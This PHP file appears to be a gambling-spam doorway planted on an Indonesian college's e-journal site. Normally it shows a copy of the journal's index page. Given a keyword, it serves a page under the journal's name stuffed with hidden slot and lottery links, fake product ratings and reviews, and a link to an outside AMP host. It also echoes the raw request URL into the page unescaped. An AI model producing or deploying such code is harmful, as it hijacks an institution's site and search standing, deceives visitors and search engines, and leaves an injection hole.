<?php

$btnShort = "https://jurnal.stiebp.ac.id/="; //LINK SHORTBUTTON
$amp_link = "https://seo-burung-nuri.pages.dev/"; //LINK AMP

function feedback404()
{
    $asd = <<<ASD

<?php
// index.php — versi mandiri dengan CSS & JS inline
?>
<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>e-Jurnal STIE Bhakti Pembangunan</title>

<!-- ====== CSS Langsung (tanpa eksternal) ====== -->
<style>
    body {
        margin: 0;
        font-family: "Noto Sans", Arial, sans-serif;
        background-color: #f9f9fb;
        color: #222;
        line-height: 1.6;
    }

    header {
        background: linear-gradient(135deg, #003366, #005fa3);
        color: white;
        padding: 1rem 0;
        text-align: center;
        box-shadow: 0 2px 4px rgba(0,0,0,0.15);
    }

    header img {
        max-height: 100px;
        width: auto;
        border-radius: 6px;
    }

    nav ul {
        list-style: none;
        padding: 0;
        margin: 1rem 0 0 0;
        display: flex;
        justify-content: center;
        gap: 1.5rem;
    }

    nav ul li a {
        color: white;
        text-decoration: none;
        font-weight: bold;
        transition: color 0.2s;
    }

    nav ul li a:hover {
        color: #ffcc00;
    }

    .about_site {
        max-width: 900px;
        margin: 2rem auto;
        background: white;
        padding: 1.5rem;
        border-radius: 8px;
        box-shadow: 0 1px 3px rgba(0,0,0,0.1);
    }

    .about_site h2 {
        margin-top: 0;
    }

    .journals {
        max-width: 1000px;
        margin: 2rem auto;
        background: white;
        border-radius: 8px;
        padding: 1.5rem;
        box-shadow: 0 1px 3px rgba(0,0,0,0.1);
    }

    .journals h2 {
        border-bottom: 3px solid #005fa3;
        padding-bottom: .3rem;
        margin-bottom: 1rem;
        color: #003366;
    }

    .journals ul {
        list-style: none;
        padding: 0;
        margin: 0;
    }

    .journals li {
        display: flex;
        flex-wrap: wrap;
        align-items: flex-start;
        margin-bottom: 2rem;
        border-bottom: 1px solid #ddd;
        padding-bottom: 1rem;
    }

    .journals li:last-child {
        border-bottom: none;
    }

    .journals .thumb img {
        max-width: 160px;
        border-radius: 8px;
        margin-right: 1rem;
    }

    .journals .body h3 a {
        color: #005fa3;
        text-decoration: none;
    }

    .journals .body h3 a:hover {
        text-decoration: underline;
    }

    .journals .description {
        margin-top: .5rem;
        text-align: justify;
    }

    .journals ul.links {
        display: flex;
        gap: 1rem;
        margin-top: .8rem;
        padding: 0;
    }

    .journals ul.links li a {
        background: #005fa3;
        color: white;
        padding: .4rem .8rem;
        border-radius: 5px;
        text-decoration: none;
        font-size: .9rem;
        transition: 0.2s;
    }

    .journals ul.links li a:hover {
        background: #003f6e;
    }

    footer {
        background: #003366;
        color: #fff;
        padding: 2rem 1rem;
        text-align: center;
        font-size: .9rem;
    }

    footer img {
        max-height: 40px;
        margin-top: 1rem;
        opacity: 0.9;
    }

    @media (max-width: 768px) {
        .journals li {
            flex-direction: column;
            align-items: center;
        }

        .journals .thumb img {
            margin: 0 0 1rem 0;
            max-width: 90%;
        }
    }

    /* Tombol back-to-top */
    #backToTop {
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: #005fa3;
        color: white;
        border: none;
        padding: .6rem 1rem;
        border-radius: 50px;
        cursor: pointer;
        font-size: 14px;
        box-shadow: 0 3px 5px rgba(0,0,0,0.2);
        display: none;
        transition: background 0.3s;
    }

    #backToTop:hover {
        background: #003f6e;
    }
</style>
</head>

<body>
<header>
    <img src="https://jurnal.stiebp.ac.id/public/site/pageHeaderTitleImage_en_US.png" alt="STIE Bhakti Pembangunan Logo">
    <nav>
        <ul>
            <li><a href="https://jurnal.stiebp.ac.id/index.php/index/index">Home</a></li>
            <li><a href="https://jurnal.stiebp.ac.id/index.php/index/user/register">Register</a></li>
            <li><a href="https://jurnal.stiebp.ac.id/index.php/index/login">Login</a></li>
        </ul>
    </nav>
</header>

<div class="about_site">
    <p><strong>Jurnal STIE BP</strong> merupakan jurnal yang langsung dikelola oleh program studi yang ada di STIE Bhakti Pembangunan: Sarjana Akuntansi, Sarjana Manajemen, Diploma Tiga Akuntansi, Diploma Tiga Manajemen Perusahaan, dan Magister Manajemen. 
    Jurnal STIE BP rutin menerbitkan artikel-artikel ilmiah dosen dan mahasiswa secara konsisten. Berikut adalah jurnal-jurnal yang diterbitkan oleh STIE BP:</p>
</div>

<div class="journals">
    <h2>Daftar Jurnal</h2>

    <!-- Contoh item jurnal -->
    <ul>
        <li>
            <div class="body">
                <h3><a href="https://jurnal.stiebp.ac.id/index.php/MRB">Management Research and Business Journal (MRB)</a></h3>
                <div class="description">
                    <p>Jurnal MRB berkomitmen menerbitkan penelitian berkualitas tinggi yang memperluas pemahaman tentang teori dan praktik Manajemen dan Bisnis.</p>
                </div>
                <ul class="links">
                    <li><a href="https://jurnal.stiebp.ac.id/index.php/MRB">View Journal</a></li>
                    <li><a href="https://jurnal.stiebp.ac.id/index.php/MRB/issue/current">Current Issue</a></li>
                </ul>
            </div>
        </li>

        <li>
            <div class="body">
                <h3><a href="https://jurnal.stiebp.ac.id/index.php/ARBUS">Accounting Research and Business Journal (ARBUS)</a></h3>
                <div class="description">
                    <p>Jurnal akuntansi untuk kepentingan umum yang mencakup semua bidang akuntansi, audit, pelaporan keuangan, dan perpajakan.</p>
                </div>
                <ul class="links">
                    <li><a href="https://jurnal.stiebp.ac.id/index.php/ARBUS">View Journal</a></li>
                    <li><a href="https://jurnal.stiebp.ac.id/index.php/ARBUS/issue/current">Current Issue</a></li>
                </ul>
            </div>
        </li>

        <li>
            <div class="body">
                <h3><a href="https://jurnal.stiebp.ac.id/index.php/MBPRACT">Management and Best Practice Journal (MBPRACT)</a></h3>
                <div class="description">
                    <p>Menerbitkan penelitian di bidang bisnis dan manajemen, ditujukan bagi cendekiawan, praktisi, dan peneliti.</p>
                </div>
                <ul class="links">
                    <li><a href="https://jurnal.stiebp.ac.id/index.php/MBPRACT">View Journal</a></li>
                    <li><a href="https://jurnal.stiebp.ac.id/index.php/MBPRACT/issue/current">Current Issue</a></li>
                </ul>
            </div>
        </li>

        <li>
            <div class="body">
                <h3><a href="https://jurnal.stiebp.ac.id/index.php/SEJou">Scholar Engagement Journal (SEJou)</a></h3>
                <div class="description">
                    <p>Jurnal interdisipliner berbasis kesejahteraan sosial yang menyediakan forum untuk praktik komunitas dan perubahan sosial.</p>
                </div>
                <ul class="links">
                    <li><a href="https://jurnal.stiebp.ac.id/index.php/SEJou">View Journal</a></li>
                    <li><a href="https://jurnal.stiebp.ac.id/index.php/SEJou/issue/current">Current Issue</a></li>
                </ul>
            </div>
        </li>
    </ul>
</div>

<footer>
    <p><strong>STIE Bhakti Pembangunan Jakarta</strong><br>
    Jl. Sabar No 66, Petukangan Selatan, Pesanggrahan, Jakarta, 12270<br>
    Telp : 021-7362445 / 021-7362467<br>
    WA : 081511585039 / 081386065560 / 087809998580<br>
    Fax : 021-7363569</p>
    <img src="https://jurnal.stiebp.ac.id/templates/images/ojs_brand.png" alt="OJS PKP">
</footer>

<!-- Tombol scroll ke atas -->
<button id="backToTop">↑ Top</button>

<!-- ====== JS Langsung (tanpa eksternal) ====== -->
<script>
    // tombol back-to-top
    const btnTop = document.getElementById("backToTop");
    window.onscroll = function() {
        if (document.body.scrollTop > 300 || document.documentElement.scrollTop > 300) {
            btnTop.style.display = "block";
        } else {
            btnTop.style.display = "none";
        }
    };
    btnTop.onclick = function() {
        window.scrollTo({ top: 0, behavior: 'smooth' });
    };
</script>
</body>
</html>



ASD;

echo $asd;
}

if (isset($_GET['berita'])) {
    $filename = "daftar.txt";
    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $target_string = strtolower($_GET['berita']);
    foreach ($lines as $item) {
        if (strtolower($item) === $target_string) {
            $BRAND = strtoupper($target_string);
        }
    }
    if (isset($BRAND)) {
        $BRANDS = $BRAND;
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        if (isset($fullUrl)) {
            $parsedUrl = parse_url($fullUrl);
            $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
            $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
            $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
            $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
            $urlPath = $baseUrl;
        } else {
            echo "URL saat ini tidak didefinisikan.";
        }
    } else {
        feedback404();
        exit();
    }
} else {
    feedback404();
    
    exit();
}
?>

<!DOCTYPE html>
<html class="js audio audio-ogg audio-mp3 audio-opus audio-wav audio-m4a cors cssanimations backgroundblendmode flexbox inputtypes-search inputtypes-tel inputtypes-url inputtypes-email no-inputtypes-datetime inputtypes-date inputtypes-month inputtypes-week inputtypes-time inputtypes-datetime-local inputtypes-number inputtypes-range inputtypes-color localstorage placeholder svg xhr2" lang="en">
    <head><meta charset="utf-8">
    
    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
window.DATADOG_CONFIG={clientToken:'puba7a42f353afa86efd9e11ee56e5fc8d9',applicationId:'8561f3f6-5252-482b-ba9f-2bbb1b009106',site:'datadoghq.com',service:'marketplace',env:'production',version:'f7d8b3d494288b34cb00105ee5d230d68b0ccca7',sessionSampleRate:0.2,sessionReplaySampleRate:5};
//]]></script>
    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
var rollbarEnvironment="production"
var codeVersion="f7d8b3d494288b34cb00105ee5d230d68b0ccca7"
//]]></script>
    <meta content="origin-when-cross-origin" name="referrer">
    <link rel="dns-prefetch" href="//s3.envato.com">
    <link rel="preload" href="https://market-resized.envatousercontent.com/themeforest.net/files/344043819/MARKETICA_PREVIEW/00-marketica-preview-sale37.__large_preview.jpg?auto=format&amp;q=94&amp;cf_fit=crop&amp;gravity=top&amp;h=8000&amp;w=590&amp;s=cc700268e0638344373c64d90d02d184c75d7defef1511b43f3ecf3627a3f2d4" as="image">
    <link rel="preload" href="https://public-assets.envato-static.com/assets/generated_sprites/logos-20f56d7ae7a08da2c6698db678490c591ce302aedb1fcd05d3ad1e1484d3caf9.png" as="image">
    <link rel="preload" href="https://public-assets.envato-static.com/assets/generated_sprites/common-5af54247f3a645893af51456ee4c483f6530608e9c15ca4a8ac5a6e994d9a340.png" as="image">
    <title><?php echo $BRANDS ?> e-Jurnal STIE Bhakti Pembangunan</title>
    <meta name="description" content="<?php echo $BRANDS ?> Jurnal STIE BP merupakan Jurnal yang langsung dikelola oleh program studi yang ada di STIE Bhakti Pembangunan, program studi terdiri dari Sarjana Akuntansi, Sarjana Manajemen, Diploma Tiga Akuntansi, Diploma Tiga Manajemen Perusahaan, Magister Manajemen.">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="icon" type="image/x-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCi7siRxkVi_jONTp42qVs9T_U6j6Z88ydrIKx204KJPlHz3NSVAJMOupI57hJysGKZAU9x7AEZiuVPsh6bYAC06Jqx_AQOkTGW41bYMAGrgwB9XzoMfwIjttlMiU3fnKtkQ7InNzksrlXw315EFQFif2SnAqnbXgKkcecQa2gy4Gn9iYZv7iBdRw5kOA/s28/download%20(10).png">
    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://public-assets.envato-static.com/assets/icons favicons/apple-touch-icon-72x72-precomposed-ea6fb08063069270d41814bdcea6a36fee5fffaba8ec1f0be6ccf3ebbb63dddb.png" sizes="72x72">
    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://public-assets.envato-static.com/assets/icons/favicons/apple-touch-icon-114x114-precomposed-bab982e452fbea0c6821ffac2547e01e4b78e1df209253520c7c4e293849c4d3.png" sizes="114x114">
    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://public-assets.envato-static.com/assets/icons/favicons/apple-touch-icon-120x120-precomposed-8275dc5d1417e913b7bd8ad048dccd1719510f0ca4434f139d675172c1095386.png" sizes="120x120">
    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://public-assets.envato-static.com/assets/icons/favicons/apple-touch-icon-144x144-precomposed-c581101b4f39d1ba1c4a5e45edb6b3418847c5c387b376930c6a9922071c8148.png" sizes="144x144">
    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://public-assets.envato-static.com/assets/icons/favicons/apple-touch-icon-precomposed-c581101b4f39d1ba1c4a5e45edb6b3418847c5c387b376930c6a9922071c8148.png">
    <link rel="stylesheet" href="https://public-assets.envato-static.com/assets/market/core/index-999d91c45b3ce6e6c7409b80cb1734b55d9f0a30546d926e1f2c262cd719f9c7.css" media="all">
    <link rel="stylesheet" href="https://public-assets.envato-static.com/assets/market/pages/default/index-ffa1c54dffd67e25782769d410efcfaa8c68b66002df4c034913ae320bfe6896.css" media="all">
    <script src="https://public-assets.envato-static.com/assets/components/brand_neue_tokens-f25ae27cb18329d3bba5e95810e5535514237937774fca40a02d8e2635fa20d6.js" nonce="TFNQUvYHwdi8uHoMheRs/Q==" defer="defer"></script>
    <meta name="theme-color" content="#333333">
    <link rel="canonical" href="<?php echo $urlPath ?>">
    <link rel="amphtml" href="<?php echo $amp_link; ?>?berita=<?php echo $BRANDS ?>">
   <script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Product",
  "name": "<?php echo $BRANDS ?> e-Jurnal STIE Bhakti Pembangunan",
  "image": "https://res.cloudinary.com/dxje0jyp5/image/upload/v1760536399/samples/waves.png",
  "description": "<?php echo $BRANDS ?> Jurnal STIE BP merupakan Jurnal yang langsung dikelola oleh program studi yang ada di STIE Bhakti Pembangunan, program studi terdiri dari Sarjana Akuntansi, Sarjana Manajemen, Diploma Tiga Akuntansi, Diploma Tiga Manajemen Perusahaan, Magister Manajemen.",
  "brand": {
    "@type": "Brand",
    "name": "<?php echo $BRANDS ?>"
  },
  "sku": "SLOT",
  "mpn": "TOTO <?php echo $BRANDS ?>",
  "url": "<?php echo $urlPath ?>",
  "offers": {
    "@type": "Offer",
    "url": "<?php echo $urlPath ?>",
    "priceCurrency": "USD",
    "price": "0.00",
    "priceValidUntil": "2025-10-27",
    "itemCondition": "https://schema.org/NewCondition",
    "availability": "https://schema.org/InStock",
    "seller": {
      "@type": "Organization",
      "name": "SLOT <?php echo $BRANDS ?>"
    }
  },
  "aggregateRating": {
    "@type": "AggregateRating",
    "ratingValue": "5.5",
    "reviewCount": 559
  },
  "review": [
    {
      "@type": "Review",
      "reviewRating": {
        "@type": "Rating",
        "ratingValue": "5",
        "bestRating": "5"
      },
      "author": {
        "@type": "Person",
        "name": "daus"
      }
    },
    {
      "@type": "Review",
      "reviewRating": {
        "@type": "Rating",
        "ratingValue": "5",
        "bestRating": "5"
      },
      "author": {
        "@type": "Person",
        "name": "mira"
      }
    }
  ]
}
</script>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position": 1,
      "name": "TOTO",
      "item": "<?php echo $urlPath ?>"
    },
    {
      "@type": "ListItem",
      "position": 2,
      "name": "SLOT BET 200 <?php echo $BRANDS ?>",
      "item": "<?php echo $urlPath ?>"
    },
    {
      "@type": "ListItem",
      "position": 3,
      "name": "SLOT GACOR <?php echo $BRANDS ?>",
      "item": "<?php echo $urlPath ?>"
    },
    {
      "@type": "ListItem",
      "position": 4,
      "name": "SITUS GACOR <?php echo $BRANDS ?>",
      "item": "<?php echo $urlPath ?>"
    },
    {
      "@type": "ListItem",
      "position": 5,
      "name": "<?php echo $BRANDS ?> e-Jurnal STIE Bhakti Pembangunan",
      "item": "<?php echo $urlPath ?>"
    }
  ]
}
</script>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Organization",
  "name": "SLOT THAILAND <?php echo $BRANDS ?>",
  "url": "<?php echo $urlPath ?>",
  "logo": "https://res.cloudinary.com/dxje0jyp5/image/upload/v1761050344/seo_hantu_vmraht.png",
  "sameAs": [
    "https://www.facebook.com/<?php echo $BRANDS ?> SLOTofficial",
    "https://twitter.com/<?php echo $BRANDS ?> SLOTslot",
    "https://www.instagram.com/<?php echo $BRANDS ?> SLOT"
  ],
  "contactPoint": {
    "@type": "ContactPoint",
    "telephone": "+62-878-7775-3325",
    "contactType": "customer support",
    "areaServed": "ID",
    "availableLanguage": ["Indonesian", "English"]
  }
}
</script>




    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
window.dataLayer=window.dataLayer||[];
//]]></script>
    <meta name="bingbot" content="nocache">

    <!-- Open Graph -->
    <meta property="og:title" content="<?php echo $BRANDS ?> e-Jurnal STIE Bhakti Pembangunan">
    <meta property="og:description" content="<?php echo $BRANDS ?> Jurnal STIE BP merupakan Jurnal yang langsung dikelola oleh program studi yang ada di STIE Bhakti Pembangunan, program studi terdiri dari Sarjana Akuntansi, Sarjana Manajemen, Diploma Tiga Akuntansi, Diploma Tiga Manajemen Perusahaan, Magister Manajemen.">
    <meta property="og:image" content="https://res.cloudinary.com/dxje0jyp5/image/upload/v1760536399/samples/waves.png">
    <meta property="og:url" content="<?php echo $urlPath ?>">
    <meta property="og:type" content="website">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="<?php echo $BRANDS ?> e-Jurnal STIE Bhakti Pembangunan">
    <meta name="twitter:description" content="<?php echo $BRANDS ?> Jurnal STIE BP merupakan Jurnal yang langsung dikelola oleh program studi yang ada di STIE Bhakti Pembangunan, program studi terdiri dari Sarjana Akuntansi, Sarjana Manajemen, Diploma Tiga Akuntansi, Diploma Tiga Manajemen Perusahaan, Magister Manajemen.">
    <meta name="twitter:image" content="https://res.cloudinary.com/dxje0jyp5/image/upload/v1760536399/samples/waves.png">
    <meta property="og:title" content="<?php echo $BRANDS ?> e-Jurnal STIE Bhakti Pembangunan">
    <meta property="og:type" content="website">
    <meta property="og:url" content="<?php echo $urlPath ?>">
    <meta property="og:image" content="https://res.cloudinary.com/dxje0jyp5/image/upload/v1760536399/samples/waves.png"/>
    <meta property="og:description" content="<?php echo $BRANDS ?> Jurnal STIE BP merupakan Jurnal yang langsung dikelola oleh program studi yang ada di STIE Bhakti Pembangunan, program studi terdiri dari Sarjana Akuntansi, Sarjana Manajemen, Diploma Tiga Akuntansi, Diploma Tiga Manajemen Perusahaan, Magister Manajemen.">
    <meta property="og:site_name" content="SLOT THAILAND">
    <meta name="csrf-param" content="authenticity_token">
    <meta name="csrf-token" content="o7V7LGbBjnF9HgzqsCOek0VUNaqFcrL72zjeu3cGTv2_7pn5UklFm7XFtDaDCfkbbeD4zdIzwPzjrUhXtbHQ">
    <meta name="turbo-visit-control" content="reload">
    <script type="text/javascript" nonce="TFNQUvYHwdi8uHoMheRs/Q==" data-cookieconsent="statistics">//<![CDATA[
var container_env_param="";(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl+container_env_param;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-W8KL5Q5');
//]]></script>


    <script type="text/javascript" nonce="TFNQUvYHwdi8uHoMheRs/Q==" data-cookie consent="marketing">//<![CDATA[
var gtmId='GTM-KGCDGPL6';var container_env_param="";(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl+container_env_param;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer',gtmId);window.addEventListener('load',function(){window.dataLayer.push({event:'pinterestReady'});});
//]]>
var gtmConfig = {}

        //]]>
    </script>
    <div style="display: none;">
        <a href="<?php echo $urlPath ?>">slot okebray.com</a>
        <a href="<?php echo $urlPath ?>">link gacor oke bray tergacor</a>
        <a href="<?php echo $urlPath ?>">slot okebray id apk</a>
        <a href="<?php echo $urlPath ?>">slot okebray.id</a>
        <a href="<?php echo $urlPath ?>">slot okesultan.net</a>
        <a href="<?php echo $urlPath ?>">slot okesultan</a>
        <a href="<?php echo $urlPath ?>">slot okesultan.com</a>
        <a href="<?php echo $urlPath ?>">slot gacor --slot(koko288)</a>
        <a href="<?php echo $urlPath ?>">link gacor okebray</a>
        <a href="<?php echo $urlPath ?>">situs gacor mami188</a>
        <a href="<?php echo $urlPath ?>">situs slot koko288</a>
        <a href="<?php echo $urlPath ?>">slot123apk --surga19.com</a>
        <a href="<?php echo $urlPath ?>">slot777 oke bray</a>
        <a href="<?php echo $urlPath ?>">slot online mami188 jp</a>
        <a href="<?php echo $urlPath ?>">slot8888 okesultan.net</a>
        <a href="<?php echo $urlPath ?>">situs gacor tante777.gold</a>
        <a href="<?php echo $urlPath ?>">slot online --satu(bintangjudi)</a>
        <a href="<?php echo $urlPath ?>">slot gaming --topan(win)</a>
        <a href="<?php echo $urlPath ?>">slotratu79.com -</a>
        <a href="<?php echo $urlPath ?>">slot gaming --gacor200</a>
        <a href="<?php echo $urlPath ?>">slot gaming --jago79🏐♣</a>
        <a href="<?php echo $urlPath ?>">slot gaming --gacor200</a>
        <a href="<?php echo $urlPath ?>">link gacor evohoki</a>
        <a href="<?php echo $urlPath ?>">link slot gcslot.org</a>
        <a href="<?php echo $urlPath ?>">slot gaming --@(https //tajirnow.com)</a>
        <a href="<?php echo $urlPath ?>">slot gaming --forwin777</a>
        <a href="<?php echo $urlPath ?>">raja132 --com</a>
        <a href="<?php echo $urlPath ?>">link gaming --88(panen88)</a>
        <a href="<?php echo $urlPath ?>">situs gaming --forwin777</a>
        <a href="<?php echo $urlPath ?>">slot gaming --b2(haha303)</a>
        <a href="<?php echo $urlPath ?>">slot online pgsoft1000</a>
        <a href="<?php echo $urlPath ?>">slot gacor bos288</a>
        <a href="<?php echo $urlPath ?>">link gaming --nagatoto168</a>
        <a href="<?php echo $urlPath ?>">slot gmesinslotming --(topanwins)</a>
        <a href="<?php echo $urlPath ?>">slot gaming --(tante777).fun</a>
        <a href="<?php echo $urlPath ?>">slot gaming --jago79🥉</a>
        <a href="<?php echo $urlPath ?>">slot gaming --303(haha303)</a>
        <a href="<?php echo $urlPath ?>">situs gaming --tpwin</a>
        <a href="<?php echo $urlPath ?>">situs gacor tante777--vip👈</a>
        <a href="<?php echo $urlPath ?>">link slot tante777➙terpercaya</a>
        <a href="<?php echo $urlPath ?>">slot online andalan-tante777✿</a>
        <a href="<?php echo $urlPath ?>">situs gaming --com(99onlinesports)</a>
        <a href="<?php echo $urlPath ?>">link game --tpwin</a>
        <a href="<?php echo $urlPath ?>">situs gaming --168(nagatoto168)</a>
        <a href="<?php echo $urlPath ?>">situs slot nagatoto168 gacor</a>
        <a href="<?php echo $urlPath ?>">link resmi --(galaxy77)</a>
        <a href="<?php echo $urlPath ?>">situs game --(tpwin)</a>
        <a href="<?php echo $urlPath ?>">slot gaming --jago79🏧</a>
        <a href="<?php echo $urlPath ?>">situs gaming --(nagakoin99</a>
        <a href="<?php echo $urlPath ?>">link bonus --com(99onlinesports)</a>
        <a href="<?php echo $urlPath ?>">link resmi --(tpwin)</a>
        <a href="<?php echo $urlPath ?>">slot official --79(jago79)🐓</a>
        <a href="<?php echo $urlPath ?>">situs gaming --panen88🤘</a>
        <a href="<?php echo $urlPath ?>">qq333bet.com --link.login</a>
        <a href="<?php echo $urlPath ?>">slot gaming --a1(nagatoto168)</a>
        <a href="<?php echo $urlPath ?>">situs official --com(99onlinesports)</a>
        <a href="<?php echo $urlPath ?>">situs gaming --evohoki.com</a>
        <a href="<?php echo $urlPath ?>">slot online --satu(vipdewa-play.org)</a>
        <a href="<?php echo $urlPath ?>">slot gaming --a1(topanwin)</a>
        <a href="<?php echo $urlPath ?>">link gaming --evohoki.com</a>
        <a href="<?php echo $urlPath ?>">link gaming --idrhoki138</a>
        <a href="<?php echo $urlPath ?>">link gaming --klikslots.com</a>
        <a href="<?php echo $urlPath ?>">situs gaming --(tpwin)</a>
        <a href="<?php echo $urlPath ?>">link resmi --evohoki.com</a>
        <a href="<?php echo $urlPath ?>">link resmi --arunabet</a>
        <a href="<?php echo $urlPath ?>">situs official --nusagg.com</a>
        <a href="<?php echo $urlPath ?>">situs official --jago79🪷</a>
        <a href="<?php echo $urlPath ?>">situs gaming --terbaik(panen88)</a>
        <a href="<?php echo $urlPath ?>">link gaming --resmi(panen88)</a>
        <a href="<?php echo $urlPath ?>">slot online bb-koko288</a>
        <a href="<?php echo $urlPath ?>">situs slot cc-koko288</a>
        <a href="<?php echo $urlPath ?>">slot gaming --a1(haha303)</a>
        <a href="<?php echo $urlPath ?>">slot gaming --jago79🪬</a>
        <a href="<?php echo $urlPath ?>">slot gaming --(topanwins)</a>
        <a href="<?php echo $urlPath ?>">slot gaming --a1(topanwin</a>
        <a href="<?php echo $urlPath ?>">situs gaming --terbaik(panen88)</a>
        <a href="<?php echo $urlPath ?>">TOTO SLOT</a>
        <a href="<?php echo $urlPath ?>">INFINI88</a>
        <a href="<?php echo $urlPath ?>">SLOT MAXWIN</a>
        <a href="<?php echo $urlPath ?>">SLOT GACOR SIANG INI</a>
        <a href="<?php echo $urlPath ?>">situs gaming --panen88🪇</a>
        <a href="<?php echo $urlPath ?>">situs thailand --panen88🪇</a>
        <a href="<?php echo $urlPath ?>">link game --88(panen88)</a>
        <a href="<?php echo $urlPath ?>">link bonus --303(haha303)</a>
        <a href="<?php echo $urlPath ?>">link gacor -- pg haha303</a>
        <a href="<?php echo $urlPath ?>">link -- daftar koko288</a>
        <a href="<?php echo $urlPath ?>">link gacor -- lengkap koko288</a>
        <a href="<?php echo $urlPath ?>">slot gacor -- lengkap koko288</a>
        <a href="<?php echo $urlPath ?>">slot gacor -- super koko288</a>
        <a href="<?php echo $urlPath ?>">link gacor -- pg haha303</a>
        <a href="<?php echo $urlPath ?>">slot gacor p5 haha303</a>
        <a href="<?php echo $urlPath ?>">situs slot 888king</a>
        <a href="<?php echo $urlPath ?>">link -- daftar koko288</a>
        <a href="<?php echo $urlPath ?>">slot gacor -- dua haha303</a>
        <a href="<?php echo $urlPath ?>">situs gacor j2 haha303</a>
        <a href="<?php echo $urlPath ?>">slot gacor -- tiga haha303</a>
        <a href="<?php echo $urlPath ?>">situs jago --( jago79</a>
        <a href="<?php echo $urlPath ?>">situs thailand --panen88🫵</a>
        <a href="<?php echo $urlPath ?>">situs jago jago79 xyz</a>
        <a href="<?php echo $urlPath ?>">situs gacor -- pg haha303</a>
        <a href="<?php echo $urlPath ?>">situs gacor panglimabet77</a>
        <a href="<?php echo $urlPath ?>">panglima 777 slot</a>
        <a href="<?php echo $urlPath ?>">panglima 77 slot login link alternatif</a>
        <a href="<?php echo $urlPath ?>">panglima 777</a>
        <a href="<?php echo $urlPath ?>">panglima 777 slot login</a>
        <a href="<?php echo $urlPath ?>">situs gaming --99onlinesports💰</a>
        <a href="<?php echo $urlPath ?>">slot online --satu(ez338vip)</a>
        <a href="<?php echo $urlPath ?>">link bonus(topanwin)</a>
        <a href="<?php echo $urlPath ?>">link --top(bisabet)</a>
        <a href="<?php echo $urlPath ?>">slot gaming --jago79(com)</a>
        <a href="<?php echo $urlPath ?>">slot gaming --(haha303)</a>
        <a href="<?php echo $urlPath ?>">slot gaming --288(koko288)</a>
        <a href="<?php echo $urlPath ?>">slot online --satu(bisabet)</a>
        <a href="<?php echo $urlPath ?>">slot108 --mantap(haha303)</a>
        <a href="<?php echo $urlPath ?>">slotting --mantap(haha303)</a>
        <a href="<?php echo $urlPath ?>">game online --mu(depo77)</a>
        <a href="<?php echo $urlPath ?>">slot88new</a>
        <a href="<?php echo $urlPath ?>">link --baru(haha303)</a>
        <a href="<?php echo $urlPath ?>">slot gacor tante777-vip👈</a>
        <a href="<?php echo $urlPath ?>">slot gacor tante777-pasti</a>
        <a href="<?php echo $urlPath ?>">slot gaming --(haha303)</a>
        <a href="<?php echo $urlPath ?>">slotting --mantap(haha303)</a>
        <a href="<?php echo $urlPath ?>">TOTO SLOT</a>
        <a href="<?php echo $urlPath ?>">PASTIJP</a>
        <a href="<?php echo $urlPath ?>">slot gacor www.yhteys.org</a>
        <a href="<?php echo $urlPath ?>">vespa togel</a>
        <a href="<?php echo $urlPath ?>">SLOT THAILAND</a>
        <a href="<?php echo $urlPath ?>">situs official --topanwin</a>
        <a href="<?php echo $urlPath ?>">link bonus(topanwin)</a>
        <a href="<?php echo $urlPath ?>">slot gaming topanwin</a>
        <a href="<?php echo $urlPath ?>">topanwin 888 gold</a>
        <a href="<?php echo $urlPath ?>">slotting --mantap(haha303)</a>
        <a href="<?php echo $urlPath ?>">slot gacor dewakoin99.it</a>
        <a href="<?php echo $urlPath ?>">slot gacor --kawanmenang</a>
        <a href="<?php echo $urlPath ?>">slot gacor --dua(haha303)</a>
        <a href="<?php echo $urlPath ?>">slot gacor --a1(haha303a1)</a>
        <a href="<?php echo $urlPath ?>">situs gacor www.dewabos138.com</a>
        <a href="<?php echo $urlPath ?>">slot gacor h1--(haha303)</a>
        <a href="<?php echo $urlPath ?>">slot gacor c3--(haha303)</a>
        <a href="<?php echo $urlPath ?>">slot gacor e2--(haha303)</a>
        <a href="<?php echo $urlPath ?>">slot gacor d9--(haha303)</a>
        <a href="<?php echo $urlPath ?>">slot gacor f2--(haha303)</a>
        <a href="<?php echo $urlPath ?>">slot gacor j2--(haha303)</a>
